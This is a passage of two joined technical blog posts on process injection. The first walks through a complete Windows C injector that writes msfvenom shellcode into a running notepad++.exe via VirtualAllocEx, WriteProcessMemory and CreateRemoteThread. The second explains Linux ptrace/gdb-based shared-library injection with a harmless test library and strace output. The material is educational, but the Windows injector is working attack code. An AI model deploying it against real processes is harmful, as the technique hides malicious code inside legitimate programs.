   TEXT='Hacked!': This part of the command specifies the text to put inside the message box.

   TITLE='Your Have Been Hacked': This option specifies the title of the message box.

   This step is a crucial foundation for what follows, setting the stage for a deeper understanding of
   the process injection technique.

Detailed Code Breakdown
Process Enumeration and Opening

HANDLE ProcessEnumerateAndSearch(PWCHAR ProcessName) {
	HANDLE hSnapshot;
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[X] CreateToolhelp32Snapshot has failed with error %d", GetLastError());
	}

	if (Process32First(hSnapshot, &pe) == FALSE) {
		printf("[X] Process32First has failed with error %d", GetLastError());
	}

	do {
		if (wcscmp(pe.szExeFile, ProcessName) == 0) {
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID)) == NULL) {
				printf("[X] OpenProcess has failed with error %d", GetLastError());
				break;
			} else {
				printf("Process PID: %d has been opened", pe.th32ProcessID);
				break;
			}
		}
	} while (Process32Next(hSnapshot, &pe));
	return hProcess;
}

     * This function enumerates all running processes using CreateToolhelp32Snapshot and iterates
       through them with Process32First and Process32Next.
     * It compares each process's executable name (pe.szExeFile) with the provided ProcessName.
     * If a match is found, it opens the process with OpenProcess for all access rights.

Injecting the Shellcode

BOOL InjectShellcode(HANDLE hProcess, unsigned char* payload, SIZE_T dwSize ) {
	LPVOID lpPayloadAddress;
	SIZE_T dwNumberOfWrittenChars;
	DWORD dwOldProtect;

	printf("Allocating Memory: %d bytes \n", dwSize);
	if ((lpPayloadAddress = VirtualAllocEx(hProcess, NULL, dwSize,
			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		printf("[X] VirtualAllocEx has failed with error %d\n", GetLastError());
		return FALSE;
	}

	printf("Memory Successfully Allocated at addr: %p\n", lpPayloadAddress);
	getchar();

	if ((!WriteProcessMemory(hProcess, lpPayloadAddress, payload, dwSize, &dwNumberOfWrittenChars)) || 
			dwNumberOfWrittenChars != dwSize) {
		printf("[X] WriteProcessMemory has failed with error %d", GetLastError());
		return FALSE;
	}
	printf("Process Memory successfully allocated");
	if (VirtualProtectEx(hProcess, lpPayloadAddress, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect) == 0) {
		printf("[X] VirtualProtectEx has failed with error %d", GetLastError());
		return FALSE;
	}

	if(CreateRemoteThread(hProcess, NULL, NULL, lpPayloadAddress, NULL, NULL, NULL) == NULL) {
		printf("[X] CreateRemoteThread has failed with error %d", GetLastError());
		return FALSE;
	}

	return TRUE;
}

     * This function injects the shellcode into the target process.
     * VirtualAllocEx allocates memory in the target process.
     * WriteProcessMemory writes the payload into the allocated memory.
     * VirtualProtectEx changes the protection of the allocated memory to the executable.
     * CreateRemoteThread creates a thread in the target process to execute the payload.

Main Function

int main() {
	HANDLE hTarget;
	size_t payload_size = 298;
	unsigned char payload[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
		"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
		"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
		"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
		"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
		"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
		"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
		"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
		"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
		"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
		"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
		"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
		"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
		"\x4c\x8d\x85\x06\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
		"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
		"\xd5\x48\x61\x63\x6b\x65\x64\x21\x00\x59\x6f\x75\x72\x20"
		"\x48\x61\x76\x65\x20\x42\x65\x65\x6e\x20\x48\x61\x63\x6b"
		"\x65\x64\x00";

	hTarget = ProcessEnumerateAndSearch(L"notepad++.exe");
	InjectShellcode(hTarget, payload, payload_size);
}

     * The main function is the entry point of the program.
     * It defines the payload (malicious code) and targets a specific process, in this case,
       "notepad++.exe".
     * The ProcessEnumerateAndSearch function is used to find and open the target process.
     * InjectShellcode is called to perform the actual process injection.

   This code provides a straightforward example of process injection, demonstrating the sequence of
   steps necessary to perform this technique. Each function plays a crucial role in the overall
   operation, from locating the target process to executing the injected code.

#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <errors.h>

HANDLE ProcessEnumerateAndSearch(PWCHAR ProcessName) {
	HANDLE hSnapshot;
	HANDLE hProcess = NULL;
	PROCESSENTRY32 pe = { .dwSize = sizeof(PROCESSENTRY32) };

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[X] CreateToolhelp32Snapshot has failed with error %d", GetLastError());
	}

	if (Process32First(hSnapshot, &pe) == FALSE) {
		printf("[X] Process32First has failed with error %d", GetLastError());
	}

	do {
		if (wcscmp(pe.szExeFile, ProcessName) == 0) {

			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID)) == NULL) {
				printf("[X] OpenProcess has failed with error %d", GetLastError());
				break;
			} else {
				printf("Process PID: %d has been opened", pe.th32ProcessID);
				break;
			}
		}
	} while (Process32Next(hSnapshot, &pe));
	return hProcess;
}


BOOL InjectShellcode(HANDLE hProcess, unsigned char* payload, SIZE_T dwSize ) {
	LPVOID lpPayloadAddress;
	SIZE_T dwNumberOfWrittenChars;
	DWORD dwOldProtect;

	printf("Allocating Memory: %d bytes \n", dwSize);
	if ((lpPayloadAddress = VirtualAllocEx(hProcess, NULL, dwSize, \
			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL) {
		printf("[X] VirtualAllocEx has failed with error %d\n", GetLastError());
		return FALSE;
	}

	printf("Memory Successfully Allocated at addr: %p\n", lpPayloadAddress);
	getchar();

	if ((!WriteProcessMemory(hProcess, lpPayloadAddress, payload, dwSize, &dwNumberOfWrittenChars)) || \
			dwNumberOfWrittenChars != dwSize) {
		printf("[X] WriteProcessMemory has failed with error %d", GetLastError());
		return FALSE;
	}

	printf("Process Memory successfully allocated");
	if (VirtualProtectEx(hProcess, lpPayloadAddress, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect) == 0) {
		printf("[X] VirtualProtectEx has failed with error %d", GetLastError());
		return FALSE;
	}

	if(CreateRemoteThread(hProcess, NULL, NULL, lpPayloadAddress, NULL, NULL, NULL) == NULL) {
		printf("[X] CreateRemoteThread has failed with error %d", GetLastError());
		return FALSE;
	}
	return TRUE;
}

int main() {
	HANDLE hTarget;
	size_t payload_size = 298;
	unsigned char payload[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
		"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
		"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
		"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
		"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
		"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
		"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
		"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
		"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
		"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
		"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
		"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
		"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
		"\x4c\x8d\x85\x06\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
		"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
		"\xd5\x48\x61\x63\x6b\x65\x64\x21\x00\x59\x6f\x75\x72\x20"
		"\x48\x61\x76\x65\x20\x42\x65\x65\x6e\x20\x48\x61\x63\x6b"
		"\x65\x64\x00";

	hTarget = ProcessEnumerateAndSearch(L"notepad++.exe");
	InjectShellcode(hTarget, payload, payload_size);
}

Proof Of Injection
   To verify the success of a process injection, initiate by looking at the memory dump in the target
   and incorporating a printf statement within the injector code.
   This step is crucial for real-time monitoring.
     * Begin by compiling your code.
     * Then, launch Notepad++ - our chosen target application - as the injection process specifically
       hinges on its active instance.

   Subsequently, execute your injector program. It will pause execution, displaying the memory address
   where the injection has occurred.

   Next, launch x64dbg and attach it to the Notepad++ (ALT+A) process for in-depth analysis.

   At this juncture, check the memory address (CTRL+G) in the memory dump section of x64dbg. This action
   is pivotal for observing the behaviour of the injected code.

   Finally, resume the execution of your injector. At this point, you should observe the shellcode
   present within the memory of the target process, Notepad++. This confirms the successful injection.

   That perfectly matches with our payload:
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
        "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
        "\x4c\x8d\x85\x06\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
        "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
        "\xd5\x48\x61\x63\x6b\x65\x64\x21\x00\x59\x6f\x75\x72\x20"
        "\x48\x61\x76\x65\x20\x42\x65\x65\x6e\x20\x48\x61\x63\x6b"
        "\x65\x64\x00";

Conclusion
   In conclusion, process injection is a sophisticated technique in cyber threats, skillfully concealing
   malware within legitimate processes. Understanding this method is vital for malware analysts and
   cybersecurity professionals, as it equips them to detect better and counter such elusive threats. Our
   exploration, from generating shellcode with msfvenom to executing it in a remote process, offers a
   practical insight into the mechanics of process injection. This knowledge is not just theoretical but
   an essential part of the toolkit for those on the front lines of digital security. As cyber threats
   evolve, so must our strategies and understanding.


---
https://www.labs.greynoise.io/grimoire/2025-01-28-process-injection/

How-To: Linux Process Injection
January 28, 2025

   Ever wondered how to inject code into a process on Linux?

   So back in December I read
   [https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection]a blog from
   Akamai explaining the complexities of process injection on Linux. My first instinct reading it was, surely
   it's not that hard! gdb can just call functions, why don't we just do what gdb does??

   So I thought, [https://xkcd.com/386/]Duty Calls! I'm going to figure out how gdb does it and tell the
   author - Ori David
   - why they're WRONG! There's no more powerful motivating force for research than being sure somebody else
	 is wrong!

   I finally got around to experimenting with it last week, and I'm happy to say: they were actually
   correct about everything. But I learned a bunch along the way, and expanded on their work a bit, so I
   thought I'd share my perspective!

   In this post, I'll show you how I developed a tool to load an arbitrary shared library (.so) file
   into another process's memory space. I should be very clear that this isn't a security bypass of any
   kind - you have to have access to the system and permission to debug the process - it's just an
   interesting way to tinker with your own software.

But why?
   (Note that this section is about Windows, and the rest of this blog will be about Linux - this is
   just an origin story.)

   One of the first things I ever learned in security (like EVER) was how to forcibly load a .dll file
   into a program's memory space on Windows. Why, you ask? To cheat at videogames, of course!

   I was in highschool and people I knew were doing these awesome hacks in Starcraft where they could
   have a custom HUD and flip bits in memory and even customize AI. I was never the type to ask for
   tools, but I did ask them how to do that sorta thing, and they said they injected their .dll into the
   process's memory and hooked functions to go through their code before the real code, and from the
   process's memory space you can call their functions to write to the screen (for example).

   I thought that was the COOLEST and set out to learn how!

   I picked up a book (I don't currently remember the name, but hopefully by the time I publish this
   I'll remember! - as I'm editing, I still can't figure out the book and it's driving me crazy -
   actually, see update at the bottom of this section!) and read it. They explained a bunch of different
   ways to do it, but the most straightforward was to use a fairly simple three-step process:
    1. Use VirtualAlloc() to allocate read/write memory in a foreign process
    2. Use WriteProcessMemory() to write the full path of your .dll file to that memory
    3. Use CreateRemoteThread() to start a new thread in the foreign process, with a starting point of
       LoadLibrary, and the first argument pointing to the allocated memory

   That would effectively call LoadLibrary(<.dll file>) in the process's context. When the .dll loads,
   its DllMain() function is called and it can do anything it wants in the context of the foreign
   process! This is used by antivirus and other tools.

   I doubt it works anymore, but I actually wrote a tool to do this. I also since published my old
   hacks, which haven't worked in 20 years, but you can check out this one for some idea of what I
   was up to in the early 2000s.

   This is all Windows, though, and I want to do the same thing on Linux!

   Update: On my second edit pass, this was driving me crazy. And speaking of crazy, I have DM logs from
   the olden days when I used to work on this stuff, and I actually dug into ICQ logs from 2002, where I
   found some code I'd copied from the book:

     Session Start (ICQ - 96228890:Elliott): Sat Apr 13 14:37:35 2002

     [14:37:56] Ron: One problem with my program is that I only have access to windows xp computers so
     there's no guarantee that it'll even work on windows 98.. :-/

     [14:38:16] Elliott: :(

     Session Close (Elliott): Sat Apr 13 14:40:03 2002

     Session Start (ICQ - 96228890:Elliott): Sat Apr 13 15:00:39 2002

     [15:00:42] Ron:

#include "..\CmnHdr.h"     /* See Appendix A. */
#include <WindowsX.h>
#include <tchar.h>
#include <stdio.h>
[...](BUTTON)

   Which, thanks to Googling, was enough to find an archive of the book: Programming Applications in
   Microsoft Windows by Jeffrey Richter! I knew I was keeping those logs for a reason!

Okay but WHY??
   Okay, enough driving down memory lane!

   The point of process injection is that you can run your own custom code in the context of another
   process - that means you have access to the process's virtual memory, file handles, and even binary
   code. From there, you can do a lot of tinkering with the process's internal state, including
   redirecting calls (a la LD_PRELOAD, but more powerful! If you want to know about LD_PRELOAD
   techniques, I wrote about it here, among other places).

   In the context of malware, you can use it to hide code in a running process (think Meterpreter)

   In the context of cheating, you can modify how a game works in subtle ways (like I talked about
   above).

   But in the context of reverse engineering, which is what I care about, you can do cool
   instrumentation stuff to a process to change how it works and perhaps test things. Maybe you can
   capture / modify decrypted traffic before it's processed! The sky's the limit!

   Honestly, I don't know if this is THAT useful, because you can do any of this on Linux with gdb or
   LD_PRELOAD, but I wanted to do it myself and now you're going to learn about it!

Before we start
   We need a couple things first - a target and a library, specifically. Let's look at those first!

   In case it matters, I'm testing all of this on Fedora 40, but it should work on any version of Linux
   that can run gcc / gdb / strace (ie, all of them).

Target
   I wrote the world's simplest C program to serve as a target:

#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	int i;
	for(i = 0; ; i++) {
		printf("%d\n", i);
		sleep(1);
	}
}

   It just counts:
$> gcc -o target ./target.c
$> ./target
0
1
2

   It's beautiful! We're going to be using this throughout.

mysolib.so
   I need a shared library that does something visible, because we're going to load it into a foreign
   process and we want to know that it worked, so I created this:

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

static __attribute__((constructor)) void init_method(void) {
	pid_t parent = getpid();
	printf("Parent = %d\n", parent);

	if(fork() == 0) {
		for(;;) {
			if(getpgid(parent) < 0) {
				printf("Goodbye parent!\n");
				exit(0);
			}

			printf("Test!\n");
			system("sleep 1");
		}
	}
}

   The idea is that once it starts, it forks, then loops forever printing something until the parent
   closes. It uses the constructor syntax, which is a Linux equivalent to the DllMain() function in a
   Windows .dll file.

   In a real situation, doing a fork() would probably defeat the purpose, because now you're in another
   process, but I just wanted to simplify.

   (Also, forgive the system() call - I'll explain that at the end! :) ).

How does gdb do it?
   My gut reaction to the original blog was, why do you have to overcomplicate things? Just do what gdb
   does! Let's find out what that is.

Playing with gdb
   With target running, you can find the process id (pid) using pgrep:
$> pgrep target
23552(BUTTON)

   Then attach a debugger:
$> gdb -p 23552
[...]
Using host libthread_db library "/lib64/libthread_db.so.1".
__GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, req=req@entry=0x7fff962cd310, \
	rem=rem@entry=0x7fff962cd310)
    at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:71
71        return -r;
(gdb)

   Once gdb is attached to a process, you can literally just call a function with call (or print or a
   few other keywords):
(gdb) call printf("hi\n")
$1 = 3

   And observe the output in the target process:
49
50
hi

   We kinda just injected code. Cool, isn't it? We can also, say, allocate memory (just like using
   VirtualAlloc() on Windows):
(gdb) call malloc(128)
$2 = (void *) 0x22aa36d0

   Populate it using strcpy (or other techniques) (just like using WriteProcessMemory() on Windows):
(gdb) call (void)strcpy((char*)0x22aa36d0, "/home/ron/projects/process-injection-experiments/linjector/mysolib.so")
(gdb) x/s 0x22aa36d0
0x22aa36d0:     "/home/ron/projects/process-injection-experiments/linjector/mysolib.so"

   Then run dlopen, using that memory as a parameter (just like using LoadLibrary on Windows):
(gdb) call dlopen(0x22aa36d0, 0x102)
[Attaching after Thread 0x7f10279ab740 (LWP 23552) fork to child process 23706]
[New inferior 2 (process 23706)]
[...]

   And observe the results (using the .so file above):
65
66
Parent = 23552
Test!
fish: Job 1, './target' terminated by signal SIGSEGV (Address boundary error)

   I'm not 100% why it crashes, but it doesn't really matter. The point is, if gdb can just call those
   functions in another process, why can't I? Clearly the blog is wrong! (Spoiler: it's not)

What gdb is doing
   Many (smarter) people would probably read the gdb source (which has some hilarious comments) or
   documentation, but I got bored realllllly quickly. So I did things my own way - experimentation.

   How does somebody like me learn what gdb is doing? Debug the debugger, of course! It's just crazy
   enough to work!

   Start the target again, attach a debugger again, get back to where we were before crashing it:
$> gdb -p $(pgrep target)
[...]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
__GI___clock_nanosleep (clock_id=clock_id@entry=0, flags=flags@entry=0, req=req@entry=0x7ffdcb59ec20, \
	rem=rem@entry=0x7ffdcb59ec20)
    at ../sysdeps/unix/sysv/linux/clock_nanosleep.c:71
71        return -r;
(gdb)

   You can even type in the command so it's ready to go:
(gdb) call malloc(0x1337)

   Now in ANOTHER window, use strace to debug gdb (isn't this fun??):
$> strace -p $(pgrep gdb) -o strace.out
strace: Process 24189 attached

   Then run the command:
(gdb) call malloc(0x1337)
$1 = (void *) 0x2c2c56b0

   And observe the strace output, which is written to strace.out (and is also enormous):
restart_syscall(<... resuming interrupted poll ...>) = 1
[...]
pwrite64(11, "\314", 1, 140728015121279) = 1
ptrace(PTRACE_GETREGS, 23965, {r15=0x403e00, r14=0x7faa850fb000, r13=0, r12=0, rbp=0x7ffdcb59ec10, \
rbx=0xffffffffffffff88, r11=0x202, r10=0x7ffdcb59ec20, r9=0xfffffffd, r8=0x64, rax=0xfffffffffffffdfc, \
rcx=0x7faa84f97457, rdx=0x7ffdcb59ec20, rsi=0, rdi=0, orig_rax=0xe6, rip=0x7faa84f97457, cs=0x33, \
eflags=0x202, rsp=0x7ffdcb59ec08, ss=0x2b, fs_base=0x7faa84eb0740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
ptrace(PTRACE_ETREGS, 23965, {r15=0x403e00, r14=0x7faa850fb000, r13=0, r12=0, rbp=0x7ffdcb59ec10, rbx=0xffffff
ffffffff88, r11=0x202, r10=0x7ffdcb59ec20, r9=0xfffffffd, r8=0x64, rax=0xfffffffffffffdfc, rcx=0x7faa84f97457,
 rdx=0x7ffdcb59ec20, rsi=0, rdi=0x1337, orig_rax=0xe6, rip=0x7faa84f97457, cs=0x33, eflags=0x202, rsp=0x7ffdcb
59ec08, ss=0x2b, fs_base=0x7faa84eb0740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0

[...]

pread64(11, "\220", 1, 140370351439267) = 1
pwrite64(11, "\314", 1, 140370351439267) = 1
pread64(11, "\220", 1, 140370351439399) = 1
pwrite64(11, "\314", 1, 140370351439399) = 1
pread64(11, "\220", 1, 140370352382777) = 1
pwrite64(11, "\314", 1, 140370352382777) = 1
pread64(11, "\220", 1, 140370353357258) = 1
pwrite64(11, "\314", 1, 140370353357258) = 1
pread64(11, "\220", 1, 140370353402231) = 1
pwrite64(11, "\314", 1, 140370353402231) = 1
pread64(11, "\220", 1, 140370353480957) = 1
pwrite64(11, "\314", 1, 140370353480957) = 1
pread64(11, "\314", 1, 140728015121279) = 1
pwrite64(11, "\314", 1, 140728015121279) = 1
ptrace(PTRACE_CONT, 23965, 0x1, 0)      = 0

[...]

rt_sigprocmask(SIG_BLOCK, [INT ALRM TERM CHLD WINCH], [], 8) = 0
pipe2([12, 13], O_CLOEXEC)              = 0
fcntl(12, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
fcntl(13, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
poll([{fd=12, events=POLLIN}], 1, 0)    = 0 (Timeout)
read(12, 0x7ffcfa320b87, 1)             = -1 EAGAIN (Resource temporarily unavailable)
write(13, "+", 1)                       = 1
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=23965, si_uid=1000, si_status=SIGSEGV, si_utime=0,
si_stime=2 /* 0.02 s */} ---
read(12, "+", 1)                        = 1
read(12, 0x7ffcfa31fde7, 1)             = -1 EAGAIN (Resource temporarily unavailable)
write(13, "+", 1)                       = 1
rt_sigreturn({mask=[]})                 = 0
read(5, 0x7ffcfa321267, 1)              = -1 EAGAIN (Resource temporarily unavailable)
read(12, "+", 1)                        = 1
read(12, 0x7ffcfa3208b7, 1)             = -1 EAGAIN (Resource temporarily unavailable)

[...]

ptrace(PTRACE_PEEKUSER, 23965, 8*SS+8, [0x7faa84eb0740]) = 0
pread64(11, "@\7\353\204\252\177\0\0\340\20\353\204\252\177\0\0@\7\353\204\252\177\0\0\0\0\0\0\0\0\0\0"..., \
2368, 140370351163200) = 2368
ptrace(PTRACE_GETREGS, 23965, {r15=0x403e00, r14=0x7faa850fb000, r13=0, r12=0, rbp=0x7ffdcb59eb68, rbx=0xfffff
fffffffff88, r11=0x202, r10=0x4, r9=0x1, r8=0, rax=0x2c2c69f0, rcx=0x2c2c69f0, rdx=0, rsi=0x1337, rdi=0x2c2c69
f0, orig_rax=0xffffffffffffffff, rip=0x7ffdcb59eb7f, cs=0x33, eflags=0x10206, rsp=0x7ffdcb59eb70, ss=0x2b, \
fs_base=0x7faa84eb0740, gs_base=0, ds=0, es=0, fs=0, gs=0}) = 0
newfstatat(AT_FDCWD, "/proc/23965/fd/0", {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x3), ...}, 0) = 0
fstat(0, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x1), ...}) = 0

[...]

   For the FULL output, you can strace the whole gdb execution - it's much, much bigger, but you'll see
   extra bits like where it reads the memory file:
$> strace -o strace.out gdb -p $(pgrep target)

   What I actually learned from all this was:
     * gdb uses /proc/<pid>/mem to access memory, and pread() / pwrite() to read and edit it (though in
       the source, they note that there are other techniques that are less efficient for OSes that don't
       have that file),
     * gdb uses ptrace(PTRACE_GETREGS, ...) and ptrace(PTRACE_SETREGS, ...) to change registers, and
     * gdb seems to use ptrace(PTRACE_CONT, ...) to call the function, which means it's presumably just
       moving rip and calling new code from somewhere, but I never figured out how it actually did that.

   So basically, gdb is doing exactly what the blog explained. Huh!

So what else can we do?
   Okay, so I proved that I was wrong (or at least that the person I thought was wrong was actually
   right). But that's not a satisfying ending, so let's see if we can take this a step or two further!

   I'm sure there are tons of way to do this, and in particular I'm sure that whatever gdb is doing is
   better that what I'm going to do, but let's look at one technique to load a custom .so file into a
   Linux process.

   I published the final version on Github, but we'll build a tool step by step until it gets too
   complex.

Debugging a remote process

   Here's the simplest possible debugger:
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ptrace.h>
#include <sys/wait.h>

int main(int argc, char *argv[]) {
	if(argc < 2) {
		fprintf(stderr, "Usage: %s <pid>\n", argv[0]);
		exit(1);
	}

	pid_t pid = atol(argv[1]);

	if(ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
		fprintf(stderr, "Error attaching: %d\n", errno);
		exit(1);
	}

	// Wait for the attach to complete
	int status;
	waitpid(pid, &status, WSTOPPED);

	printf("Done!\n");

	ptrace(PTRACE_DETACH, pid, 0, 0);

	return 0;
	}

   It requires no special compile flags, either:
$> gcc -o test test.c

   In general, ptrace(PTRACE_ATTACH, ...) and ptrace(PTRACE_SEIZE, ...) are the two ways to attach to an
   already-running process; from the manpage ptrace(2):

PTRACE_ATTACH
       Attach  to  the process specified in pid, making it a tracee of the calling process.  The
       tracee is sent a SIGSTOP, but will not necessarily have stopped by the completion of this
       call; use waitpid(2) to wait for the tracee to stop.  See the "Attaching  and  detaching"
       subsection for additional information.  (addr and data are ignored.)

       Permission to perform a PTRACE_ATTACH is governed by a ptrace access mode PTRACE_MODE_AT‐
       TACH_REALCREDS check; see below.

PTRACE_SEIZE (since Linux 3.4)
       Attach  to  the process specified in pid, making it a tracee of the calling process.  Un‐
       like PTRACE_ATTACH, PTRACE_SEIZE does not stop the process.  Group-stops are reported  as
       PTRACE_EVENT_STOP  and  WSTOPSIG(status) returns the stop signal.  Automatically attached
       children stop with PTRACE_EVENT_STOP and WSTOPSIG(status) returns SIGTRAP instead of hav‐
       ing SIGSTOP signal delivered to them.  execve(2) does not deliver an extra SIGTRAP.  Only
       a PTRACE_SEIZEd process can accept  PTRACE_INTERRUPT  and  PTRACE_LISTEN  commands.   The
       "seized" behavior just described is inherited by children that are automatically attached
       using  PTRACE_O_TRACEFORK,  PTRACE_O_TRACEVFORK,  and  PTRACE_O_TRACECLONE.  addr must be
       zero.  data contains a bit mask of ptrace options to activate immediately.

       Permission to perform a PTRACE_SEIZE is governed by a ptrace access mode  PTRACE_MODE_AT‐
       TACH_REALCREDS check; see below.(BUTTON)

   When you attach with PTRACE_ATTACH, the process will receive the signal SIGSTOP (and your process
   will receive SIGCHLD). You can use waitpid() to wait for that signal. Then you can tinker with the
   process as much as you want before using PTRACE_DETACH to let the program continue to do its thing.
   You don't have to use PTRACE_DETACH, it'll auto-detach when your process ends, but it's polite!

   You can use strace to make sure your debugger is doing what you think it's doing:
$> strace ./test $(pgrep target)
execve("./test", ["./test", "27290"], 0x7ffed2e67eb8 /* 62 vars */) = 0
[...]
ptrace(PTRACE_ATTACH, 27290)            = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_TRAPPED, si_pid=27290, si_uid=1000, si_status=SIGSTOP, si_utime=0,
si_stime=1 /* 0.01 s */} ---
wait4(27290, [{WIFSTOPPED(s) && WSTOPSIG(s) == SIGSTOP}], WSTOPPED, NULL) = 27290
